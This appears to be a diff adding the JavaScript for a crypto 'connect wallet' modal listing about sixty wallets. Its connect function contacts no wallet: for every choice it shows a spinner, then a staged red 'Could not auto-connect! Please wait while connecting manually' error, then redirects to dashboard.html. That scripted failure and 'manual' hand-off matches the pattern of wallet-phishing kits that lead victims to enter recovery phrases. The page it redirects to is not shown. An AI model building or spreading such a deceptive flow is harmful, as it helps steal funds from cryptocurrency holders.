@@ -1,0 +1,486 @@
+class WalletConnector {
+  constructor() {
+    this.wallets = [
+      "WalletConnect",
+      "Metamask",
+      "Trust Wallet",
+      "1Inch Wallet",
+      "AAVE Wallet",
+      "Algorand Wallet",
+      "Argent",
+      "Atomic Wallet",
+      "Autherum Wallet",
+      "Avax",
+      "Bancor Wallet",
+      "Band Protocol Wallet",
+      "Binance",
+      "Cardano Wallet",
+      "Coinbase Wallet",
+      "Coinomi Wallet",
+      "Cosmos Wallet",
+      "Defiant Wallet",
+      "Digitex Wallet",
+      "Elrond Wallet",
+      "Enjin Wallet",
+      "EOS Wallet",
+      "Exodus Wallet",
+      "Falcon Swap Wallet",
+      "Formatic Wallet",
+      "Harmony Wallet",
+      "Hex Wallet",
+      "Jaxx Wallet",
+      "Kardia Chain Wallet",
+      "Kava Wallet",
+      "Keplr",
+      "Klever Wallet",
+      "Kyber Swap Wallet",
+      "Ledger Live",
+      "Ledger Wallet",
+      "Maiar Wallet",
+      "MEW Wallet",
+      "Monero Wallet",
+      "Moonlet Wallet",
+      "Neon Wallet",
+      "Octofi Wallet",
+      "Ocean Wallet",
+      "Oasis Wallet",
+      "OnChain Wallet",
+      "Peakdefi Wallet",
+      "Phantom",
+      "Polkadot Wallet",
+      "Portis Wallet",
+      "Rainbow",
+      "Ronin Wallet",
+      "SafePal Wallet",
+      "Samourai Wallet",
+      "Skale Wallet",
+      "Solflare Wallet",
+      "Sollet Wallet",
+      "Tezos Wallet",
+      "Theta Wallet",
+      "Tomo Chain Wallet",
+      "Tron Wallet",
+      "Wax Wallet",
+      "Zilliqa Wallet",
+    ];
+
+    this.walletLogos = {
+      WalletConnect: "images/walletconnect.png",
+      Metamask: "images/metamask.png",
+      "Trust Wallet": "images/trust-wallet.png",
+      "Maiar Wallet": "images/maiar.png",
+      "Oasis Wallet": "images/oasis.png",
+      "Ronin Wallet": "images/ronin.png",
+      Ethereum: "images/ethereum.png",
+      Keplr: "images/keplr.png",
+      Rainbow: "images/rainbow.png",
+      Argent: "images/argent.png",
+      Binance: "images/binance.png",
+      "OnChain Wallet": "images/onchain.png",
+      "AAVE Wallet": "images/aave.png",
+      "Coinbase Wallet": "images/coincase.png",
+      "Ledger Wallet": "images/ledger.png",
+      "Sollet Wallet": "images/sollet.png",
+      "Solflare Wallet": "images/solflare.png",
+      "Samourai Wallet": "images/samu.png",
+      "Enjin Wallet": "images/enjin.png",
+      "Peakdefi Wallet": "images/peakdefi.png",
+      "MEW Wallet": "images/mew.png",
+      Avax: "images/avax.png",
+      "Digitex Wallet": "images/digitex.png",
+      "Autherum Wallet": "images/autherum.png",
+      "Portis Wallet": "images/portis.png",
+      "SafePal Wallet": "images/safepal.png",
+      "Formatic Wallet": "images/formatic.png",
+      "Exodus Wallet": "images/exodus.png",
+      "Defiant Wallet": "images/defiant.png",
+      "Skale Wallet": "images/skale.png",
+      Phantom: "images/phantom.png",
+      "Coinomi Wallet": "images/coinomi.png",
+      "Atomic Wallet": "images/atomic.png",
+      "Tron Wallet": "images/tron.png",
+      "Band Protocol Wallet": "images/band-protocol.png",
+      "EOS Wallet": "images/eos.png",
+      "Wax Wallet": "images/wax.png",
+      "Zilliqa Wallet": "images/zilliqa.png",
+      "Polkadot Wallet": "images/polkadot.png",
+      "Monero Wallet": "images/monero.png",
+      "Klever Wallet": "images/klever.png",
+      "Neon Wallet": "images/neon.png",
+      "Theta Wallet": "images/theta.png",
+      "Tomo Chain Wallet": "images/tomo-chain.png",
+      "Jaxx Wallet": "images/jaxx.png",
+      "Elrond Wallet": "images/elrond.png",
+      "Bancor Wallet": "images/bancor.png",
+      "1Inch Wallet": "images/1inch.png",
+      "Cosmos Wallet": "images/cosmos.png",
+      "Moonlet Wallet": "images/moonlet.png",
+      "Harmony Wallet": "images/harmony-wallet.png",
+      "Tezos Wallet": "images/tezos.png",
+      "Kyber Swap Wallet": "images/kyber-swap.png",
+      "Falcon Swap Wallet": "images/falcon-swap.png",
+      "Kava Wallet": "images/kava.png",
+      "Ocean Wallet": "images/ocean.png",
+      "Hex Wallet": "images/hex.png",
+      "Cardano Wallet": "images/cardano.png",
+      "Kardia Chain Wallet": "images/kardia-chain.png",
+      "Octofi Wallet": "images/octofi.png",
+      "Algorand Wallet": "images/algorand.png",
+    };
+
+    this.filteredWallets = [...this.wallets];
+    this.init();
+  }
+
+  init() {
+    this.bindEvents();
+    this.renderWalletList();
+    this.setWalletIcons();
+    this.injectLoadingOverlay();
+  }
+
+  injectLoadingOverlay() {
+    const overlay = document.createElement("div");
+    overlay.id = "loadingOverlay";
+    overlay.style.cssText = `
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      color: white;
+      font-size: 1.2rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 9999;
+      display: none;
+    `;
+    overlay.innerHTML = `
+      <div class="spinner" style="
+        width: 40px; height: 40px;
+        border: 4px solid #fff;
+        border-top: 4px solid transparent;
+        border-radius: 50%;
+        margin-bottom: 1rem;
+        animation: spin 1s linear infinite;
+      "></div>
+      <div id="loadingMessage">Connecting...</div>
+    `;
+    document.body.appendChild(overlay);
+
+    const style = document.createElement("style");
+    style.textContent = `
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+    `;
+    document.head.appendChild(style);
+  }
+
+  bindEvents() {
+    const closeModal1 = document.getElementById("closeModal");
+    const closeModal2 = document.getElementById("closeModal2");
+    const modalOverlay = document.getElementById("modalOverlay");
+    const helpBtn = document.getElementById("helpBtn");
+
+    [closeModal1, closeModal2].forEach((btn) =>
+      btn?.addEventListener("click", () => this.closeModal())
+    );
+
+    modalOverlay?.addEventListener("click", (e) => {
+      if (e.target === modalOverlay) this.closeModal();
+    });
+
+    document
+      .getElementById("allWalletsBtn")
+      ?.addEventListener("click", () => this.showWalletList());
+
+    document
+      .getElementById("backBtn")
+      ?.addEventListener("click", () => this.showMainModal());
+
+    // All wallet clicks (main + list)
+    document.addEventListener("click", (e) => {
+      const btn = e.target.closest("[data-wallet]");
+      if (btn) {
+        const walletName = btn.dataset.wallet;
+        this.connectWallet(walletName);
+      }
+    });
+
+    const emailInput = document.getElementById("emailInput");
+    emailInput?.addEventListener("keypress", (e) => {
+      if (e.key === "Enter") this.connectEmail();
+    });
+
+    const searchInput = document.getElementById("searchInput");
+    searchInput?.addEventListener("input", (e) => {
+      this.filterWallets(e.target.value);
+    });
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key === "Escape") this.closeModal();
+    });
+
+    helpBtn?.addEventListener("click", () => {
+      // You can handle help here
+    });
+  }
+
+  setWalletIcons() {
+    document.querySelectorAll(".wallet-btn[data-wallet]").forEach((btn) => {
+      const walletName = btn.dataset.wallet;
+      const logoPath = this.walletLogos[walletName];
+
+      if (logoPath) {
+        const iconContainer = btn.querySelector(".wallet-icon");
+        if (iconContainer) {
+          iconContainer.innerHTML = "";
+          const img = document.createElement("img");
+          img.src = logoPath;
+          img.alt = `${walletName} logo`;
+          img.className = "wallet-logo";
+          iconContainer.appendChild(img);
+          iconContainer.style.background = "white";
+        }
+      }
+    });
+
+    document.querySelectorAll(".wallet-list-item").forEach((item) => {
+      const walletName = item.querySelector("span")?.textContent;
+      const logoPath = this.walletLogos[walletName];
+      const iconContainer = item.querySelector(".wallet-icon-container");
+
+      if (logoPath && iconContainer) {
+        iconContainer.innerHTML = "";
+        const img = document.createElement("img");
+        img.src = logoPath;
+        img.alt = `${walletName} logo`;
+        img.className = "wallet-list-logo";
+        iconContainer.appendChild(img);
+      }
+    });
+  }
+
+  closeModal() {
+    const modalOverlay = document.getElementById("modalOverlay");
+    if (modalOverlay) {
+      modalOverlay.classList.remove("active");
+      document.body.style.overflow = "";
+      setTimeout(() => {
+        this.showMainModal();
+      }, 200);
+    }
+  }
+
+  showWalletList() {
+    document.getElementById("mainModal")?.classList.add("hidden");
+    document.getElementById("walletListModal")?.classList.remove("hidden");
+    setTimeout(() => this.setWalletIcons(), 0);
+  }
+
+  showMainModal() {
+    document.getElementById("walletListModal")?.classList.add("hidden");
+    document.getElementById("mainModal")?.classList.remove("hidden");
+    const searchInput = document.getElementById("searchInput");
+    if (searchInput) searchInput.value = "";
+    this.filteredWallets = [...this.wallets];
+    this.renderWalletList();
+    setTimeout(() => this.setWalletIcons(), 0);
+  }
+
+  connectWallet(walletName) {
+    const loadingOverlay = document.getElementById("loadingOverlay");
+    const loadingMessage = document.getElementById("loadingMessage");
+
+    if (loadingOverlay && loadingMessage) {
+      loadingOverlay.style.display = "flex";
+      loadingMessage.textContent = `Connecting to ${walletName}...`;
+
+      setTimeout(() => {
+        loadingMessage.textContent =
+          "Could not auto-connect! Please wait while connecting manually";
+        loadingMessage.style.color = "#ff4d4f"; // Red color for error message
+      }, 3000);
+
+      setTimeout(() => {
+        window.location.href = "dashboard.html"; // Change this if needed
+      }, 5000);
+    }
+  }
+
+  connectEmail() {
+    const emailInput = document.getElementById("emailInput");
+    if (emailInput) {
+      const email = emailInput.value.trim();
+      if (email && this.isValidEmail(email)) {
+        this.connectWallet("email");
+      }
+    }
+  }
+
+  isValidEmail(email) {
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  }
+
+  filterWallets(term) {
+    term = term.toLowerCase().trim();
+    this.filteredWallets = term
+      ? this.wallets.filter((w) => w.toLowerCase().includes(term))
+      : [...this.wallets];
+    this.renderWalletList();
+  }
+
+  renderWalletList() {
+    const walletList = document.getElementById("walletList");
+    if (!walletList) return;
+
+    walletList.innerHTML = "";
+    this.filteredWallets.forEach((wallet) => {
+      const walletItem = document.createElement("button");
+      walletItem.className = "wallet-list-item";
+      walletItem.dataset.wallet = wallet;
+
+      const logoPath = this.walletLogos[wallet];
+      const iconData = this.generateWalletIcon(wallet);
+
+      walletItem.innerHTML = `
+        <div class="wallet-icon-container">
+          ${
+            logoPath
+              ? `<img src="${logoPath}" alt="${wallet}" class="wallet-list-logo">`
+              : `<div class="wallet-list-icon" style="background: ${iconData.background}">${iconData.letter}</div>`
+          }
+        </div>
+        <span>${wallet}</span>
+      `;
+
+      walletList.appendChild(walletItem);
+    });
+
+    if (this.filteredWallets.length === 0) {
+      const noResults = document.createElement("div");
+      noResults.style.cssText = "text-align:center;padding:2rem;color:#6b7280;";
+      noResults.textContent = "No wallets found";
+      walletList.appendChild(noResults);
+    }
+
+    setTimeout(() => this.setWalletIcons(), 0);
+  }
+
+  generateWalletIcon(name) {
+    const colors = [
+      "linear-gradient(135deg, #60a5fa, #3b82f6)",
+      "linear-gradient(135deg, #a78bfa, #8b5cf6)",
+      "linear-gradient(135deg, #34d399, #10b981)",
+      "linear-gradient(135deg, #fb923c, #ea580c)",
+      "linear-gradient(135deg, #f87171, #ef4444)",
+      "linear-gradient(135deg, #818cf8, #6366f1)",
+      "linear-gradient(135deg, #f472b6, #ec4899)",
+      "linear-gradient(135deg, #2dd4bf, #14b8a6)",
+    ];
+    const idx = name.length % colors.length;
+    return { background: colors[idx], letter: name.charAt(0).toUpperCase() };
+  }
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  new WalletConnector();
+});
+
+// Add CSS animations and logo styles
+const style = document.createElement("style");
+style.textContent = `
+  @keyframes slideIn {
+    from { transform: translateX(100%); opacity: 0; }
+    to { transform: translateX(0); opacity: 1; }
+  }
+  
+  @keyframes slideOut {
+    from { transform: translateX(0); opacity: 1; }
+    to { transform: translateX(100%); opacity: 0; }
+  }
+  
+  .toast {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    padding: 12px 24px;
+    border-radius: 8px;
+    z-index: 10000;
+    max-width: 300px;
+    word-wrap: break-word;
+    animation: slideIn 0.3s ease;
+    color: white;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+  }
+  
+  .toast.info {
+    background: #3b82f6;
+  }
+  
+  .toast.error {
+    background: #ef4444;
+  }
+  
+  .toast.hide {
+    animation: slideOut 0.3s ease forwards;
+  }
+  
+  /* Wallet logo styles */
+  .wallet-logo {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    padding: 4px;
+  }
+  
+  .wallet-list-logo {
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+    padding: 4px;
+  }
+  
+  .wallet-icon-container {
+    width: 40px;
+    height: 40px;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    background: white;
+  }
+  
+  /* Ensure proper sizing for generated icons */
+  .wallet-list-icon {
+    width: 100%;
+    height: 100%;
+    border-radius: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-weight: bold;
+    font-size: 1.2rem;
+  }
+  
+  /* Responsive styles */
+  @media (max-width: 480px) {
+    .wallet-icon-container {
+      width: 36px;
+      height: 36px;
+    }
+  }
+  
+  @media (max-width: 360px) {
+    .wallet-icon-container {
+      width: 32px;
+      height: 32px;
+    }
+  }
+`;
+document.head.appendChild(style);
